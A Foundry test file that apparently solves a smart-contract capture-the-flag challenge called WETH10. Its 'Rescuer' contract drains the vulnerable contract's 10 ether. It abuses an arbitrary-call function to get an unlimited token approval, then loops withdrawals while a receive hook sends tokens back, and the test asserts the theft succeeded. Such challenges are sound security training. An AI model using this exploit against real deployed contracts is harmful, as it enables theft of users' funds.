// SPDX-License-Identifier: MIT
pragma solidity =0.8.18;

import {Test} from "forge-std/Test.sol";
import {WETH10} from "src/WETH10.sol";
import {Owned} from "@solmate/auth/Owned.sol";

contract Weth10Test is Test {
    WETH10 public weth10;
    address bob;

    function setUp() public {
        weth10 = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth10), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth10).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);
        Rescuer rescuer = new Rescuer{value: 1 ether}(weth10);
        rescuer.init();
        vm.stopPrank();

        assertEq(address(weth10).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract Rescuer is Owned(msg.sender) {
    WETH10 private immutable weth10;

    event ReceivedETH(uint256 indexed amount);

    constructor(WETH10 _weth10) payable {
        weth10 = _weth10;
    }

    function init() external onlyOwner {
        // get 1 WETH10
        weth10.deposit{value: 1 ether}();
        // get approval to move tokens in behalf of weth10
        weth10.execute(
            address(weth10), 0, abi.encodeWithSelector(weth10.approve.selector, address(this), type(uint256).max)
        );
        for (uint256 i = 1; i <= 11; ++i) {
            weth10.withdrawAll();
            weth10.transferFrom(address(weth10), address(this), 1 ether);
        }
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        emit ReceivedETH(msg.value);
        if (msg.sender == address(weth10)) {
            weth10.transfer(address(weth10), msg.value);
        }
    }
}
